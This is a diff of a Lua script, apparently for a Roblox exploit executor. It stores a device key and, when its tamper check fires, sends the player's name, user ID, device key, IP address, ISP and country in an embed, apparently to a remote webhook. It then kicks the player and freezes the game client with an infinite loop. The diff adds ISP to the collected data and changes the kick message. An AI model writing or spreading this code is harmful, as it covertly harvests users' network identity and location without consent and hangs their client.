@@ -11,12 +11,8 @@ local _H = game:GetService("HttpService")
 local _tk = "N/A"
 pcall(function()
     if isfile and readfile and writefile then
-        if isfile("nazarkus_key.json") then 
-            _tk = readfile("nazarkus_key.json")
-        else
-            _tk = _H:GenerateGUID(false)
-            writefile("nazarkus_key.json", _tk)
-        end
+        if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
+        else _tk = _H:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
     end
 end)
 
@@ -47,14 +43,14 @@ if _se then
                     fields = {
                         {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
                         {name = "Device Key", value = "```" .. _tk .. "```", inline = false},
-                        {name = "Network Info", value = string.format("IP: %s\nLoc: %s, %s", ni.query or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false}
+                        {name = "Network Info", value = string.format("IP: %s\nISP: %s\nLoc: %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A"), inline = false}
                     }
                 }}
             })
         })
     end)
-    task.wait(0.5)
-    _L:Kick("Security Error: " .. tostring(_se))
+    task.wait(1)
+    _L:Kick("Security Tamper Detected.")
     while true do end return
 end
 
